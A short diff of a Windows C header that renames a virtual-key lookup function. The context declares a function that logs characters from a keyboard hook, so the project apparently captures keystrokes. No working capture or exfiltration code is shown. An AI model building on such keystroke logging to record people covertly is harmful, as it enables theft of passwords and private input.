@@ -12,12 +12,12 @@
 BOOL is_ignored(DWORD vk_code);
 
 /*
- * get_key_value - Gets the respective value of the virtual-key code.
+ * get_virtual_key_value - Gets the respective value of the virtual-key code.
  * @vk_code: The virtual-key code.
  *
  * Returns the respective string if found. If not, returns NULL.
  */
-LPCWSTR get_key_value(DWORD vk_code);
+LPCWSTR get_virtual_key_value(DWORD vk_code);
 
 /*
  * log_kbd - Logs the respective unicode characters of the provided kbd hook
